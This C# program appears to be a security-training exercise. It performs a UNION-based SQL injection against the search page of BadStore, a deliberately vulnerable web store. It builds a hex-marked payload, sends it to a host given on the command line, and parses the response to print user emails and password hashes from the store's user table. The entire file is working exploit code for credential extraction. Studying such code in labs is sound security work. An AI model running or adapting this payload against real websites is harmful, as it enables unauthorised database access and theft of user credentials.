using System;
using System.Linq;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;

namespace ch2_sqli_union
{
    class MainClass
    {
        public static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: program <host>");
                return;
            }

            string urlBase = $"http://{args[0]}/cgi-bin/badstore.cgi";
            string payload = CreatePayload();
            string fullUrl = $"{urlBase}?searchquery={Uri.EscapeUriString(payload)}&action=search";

            try
            {
                string response = GetHttpResponse(fullUrl);
                ProcessResponse(response);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        private static string CreatePayload()
        {
            string[] markers = { "FrOnTMaRker", "mIdDlEMaRker", "eNdMaRker" };
            string[] hexMarkers = markers.Select(m => string.Join("", m.Select(c => ((int)c).ToString("X2")))).ToArray();

            return $"fdsa' UNION ALL SELECT NULL, NULL, NULL, CONCAT(0x{hexMarkers[0]}, IFNULL(CAST(email AS CHAR), 0x20), 0x{hexMarkers[1]}, IFNULL(CAST(passwd AS CHAR), 0x20), 0x{hexMarkers[2]}) FROM badstoredb.userdb-- ";
        }

        private static string GetHttpResponse(string url)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (StreamReader reader = new StreamReader(response.GetResponseStream()))
            {
                return reader.ReadToEnd();
            }
        }

        private static void ProcessResponse(string response)
        {
            string frontMarker = "FrOnTMaRker";
            string middleMarker = "mIdDlEMaRker";
            string endMarker = "eNdMaRker";

            Regex regex = new Regex($"{frontMarker}(.*?){middleMarker}(.*?){endMarker}");
            MatchCollection matches = regex.Matches(response);

            foreach (Match match in matches)
            {
                Console.WriteLine($"Username: {match.Groups[1].Value}\t Password hash: {match.Groups[2].Value}");
            }
        }
    }
}
